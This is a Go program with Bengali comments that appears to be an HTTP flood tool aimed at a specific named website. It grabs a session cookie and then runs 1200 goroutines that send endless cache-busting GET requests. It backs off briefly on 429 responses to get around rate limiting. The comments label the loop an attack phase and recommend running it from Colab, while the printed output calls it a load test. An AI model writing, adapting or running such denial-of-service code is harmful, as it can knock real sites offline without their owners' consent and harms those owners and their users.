package main

import (
	"fmt"
	"math/rand"
	"net/http"
	"net/http/cookiejar"
	"time"
)

func main() {
	target := "https://myaura.xyz/" // তোমার টার্গেট সাইট
	threads := 1200 // কোলাবের জন্য ১২০০-১৫০০ থ্রেড আদর্শ

	// ১. সেশন ধরে রাখার জন্য কুকি জার তৈরি
	jar, _ := cookiejar.New(nil)
	client := &http.Client{
		Jar:     jar,
		Timeout: 10 * time.Second,
	}

	fmt.Println("🔍 Phase 1: Obtaining Session Cookie...")

	// ২. প্রথমবার সাইট ভিজিট করে কুকি সংগ্রহ
	req, _ := http.NewRequest("GET", target, nil)
	req.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36")
	
	resp, err := client.Do(req)
	if err != nil {
		fmt.Println("❌ Warm-up failed. Retrying...")
		return
	}
	resp.Body.Close()

	fmt.Printf("✅ Cookie Locked (Status: %d). Starting Load Test...\n", resp.StatusCode)

	// ৩. অ্যাটাক ফেজ
	for i := 0; i < threads; i++ {
		go func(id int) {
			for {
				// Cache Busting: প্রতিবার আলাদা URL যাতে সার্ভার ক্যাশ থেকে ডাটা না দেয়
				url := fmt.Sprintf("%s?vortex=%d&samir=%d", target, rand.Intn(100000), id)
				
				res, err := client.Get(url)
				if err == nil {
					status := res.StatusCode
					if id == 0 {
						fmt.Printf("📡 Status: %d | Active Threads: %d\n", status, threads)
					}
					
					// ৪২৯ আসলে স্মার্টলি একটু থেমে যাওয়া (Adaptive Sleep)
					if status == 429 {
						time.Sleep(time.Duration(rand.Intn(500)+500) * time.Millisecond)
					}
					res.Body.Close()
				} else {
					// নেটওয়ার্ক এরর হলে ছোট বিরতি
					time.Sleep(100 * time.Millisecond)
				}
			}
		}(i)
	}

	// ইঞ্জিন সচল রাখা
	select {}
}
